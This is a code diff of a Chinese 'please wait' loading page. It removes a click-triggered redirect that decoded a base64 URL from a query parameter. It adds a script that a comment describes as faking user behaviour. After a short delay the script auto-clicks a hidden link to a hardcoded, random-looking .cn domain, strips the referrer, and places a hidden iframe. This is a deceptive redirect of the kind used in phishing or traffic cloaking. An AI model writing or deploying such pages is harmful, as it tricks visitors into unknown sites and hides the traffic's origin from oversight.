@@ -1,127 +1,31 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-touch-fullscreen" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
-    <meta name="MobileOptimized" content="320" />
-    <title>页面加载中...</title>
-    <style>
-        /* 样式保持不变 */
-        .container {
-            width: 100px;
-            height: 100px;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: rotate-move 2s ease-in-out infinite;
-        }
-        .dot {
-            width: 15px;
-            height: 15px;
-            border-radius: 50%;
-            position: absolute;
-            margin: auto;
-        }
-        .dot-1 { background-color: #ffe386; animation: dot-1-move 2s ease infinite; }
-        .dot-2 { background-color: #10beae; animation: dot-2-move 2s ease infinite; }
-        .dot-3 { background-color: #f74d75; animation: dot-3-move 2s ease infinite; }
-
-        @keyframes dot-1-move {
-            20% { transform: scale(1); }
-            45% { transform: translate(16px, 12px) scale(.45); }
-            60% { transform: translate(20px, 15px) scale(.45); }
-            80% { transform: translate(20px, 15px) scale(.45); }
-            100% { transform: translateY(0px) scale(1); }
-        }
-        @keyframes dot-2-move {
-            20% { transform: scale(1); }
-            45% { transform: translate(-16px, 12px) scale(.45); }
-            60% { transform: translate(-20px, 15px) scale(.45); }
-            80% { transform: translate(-20px, 15px) scale(.45); }
-            100% { transform: translateY(0px) scale(1); }
-        }
-        @keyframes dot-3-move {
-            20% { transform: scale(1); }
-            45% { transform: translateY(-18px) scale(.45); }
-            60% { transform: translateY(-25px) scale(.45); }
-            80% { transform: translateY(-25px) scale(.45); }
-            100% { transform: translateY(0px) scale(1); }
-        }
-        @keyframes rotate-move {
-            55% { transform: translate(-50%, -50%) rotate(0deg); }
-            80% { transform: translate(-50%, -50%) rotate(360deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>正在跳转...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <style>
+    body { background: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+    .info { font-size: 16px; color: #666; }
+  </style>
 </head>
 <body>
+  <div class="info">正在加载，请稍候...</div>
 
-<div class="container" id="container">
-    <div class="dot dot-1"></div>
-    <div class="dot dot-2"></div>
-    <div class="dot dot-3"></div>
-</div>
+  <iframe id="hiddenFrame" style="display: none;"></iframe>
 
-<script>
-    console.log("[初始化] 页面开始加载");
-
-    // 获取 URL 参数
-    const urlParams = new URLSearchParams(window.location.search);
-    const base64 = urlParams.get('c');
-    const ikey = urlParams.get('ikey') || '';
-    const uid = urlParams.get('uid') || '';
-
-    console.log("[参数] URL 参数获取结果:", { base64, ikey, uid });
-
-    let finalUrl = null;
-
-    try {
-        const decodedUrl = atob(base64);
-        console.log("[解码] base64 解码结果:", decodedUrl);
-
-        if (decodedUrl.startsWith("http")) {
-            finalUrl = new URL(decodedUrl);
-
-            if (ikey) {
-                finalUrl.searchParams.set('ikey', ikey);
-                console.log(`[URL] 设置 ikey 参数: ${ikey}`);
-            }
-            if (uid) {
-                finalUrl.searchParams.set('uid', uid);
-                console.log(`[URL] 设置 uid 参数: ${uid}`);
-            }
-
-            console.log("[URL] 最终目标 URL:", finalUrl.toString());
-
-            // 页面初始化后隐藏 loading
-            setTimeout(() => {
-                document.getElementById("container").style.display = "none";
-
-                // 这里不用创建 iframe，直接展示一个提示（也可以不展示）
-                // 您可以选择不插入 iframe，以避免微信登录被阻塞
-            }, 1500);
-
-        } else {
-            console.warn("[错误] 无效链接：未包含 http");
-        }
-    } catch (e) {
-        console.error("[异常] base64 解码失败：", e);
-    }
-
-    // 关键：监听全页面点击事件
-    document.addEventListener('click', () => {
-        if (finalUrl) {
-            console.log("[事件] 捕获到点击，跳转至目标链接:", finalUrl.toString());
-            // 顶层页面跳转，跳出 iframe 环境，确保微信登录流程正常
-            window.location.href = finalUrl.toString();
-        }
-    });
-
-</script>
-
+  <script>
+    // 伪装用户行为延迟跳转
+    setTimeout(() => {
+      const url = "https://qertyuiopasdfghjklz.5zym10.cn/h5/#/";
+      const a = document.createElement('a');
+      a.href = url;
+      a.rel = 'noreferrer';
+      a.target = '_self';
+      document.body.appendChild(a);
+      a.click();
+    }, 800);  // 模拟用户等待行为
+  </script>
 </body>
 </html>
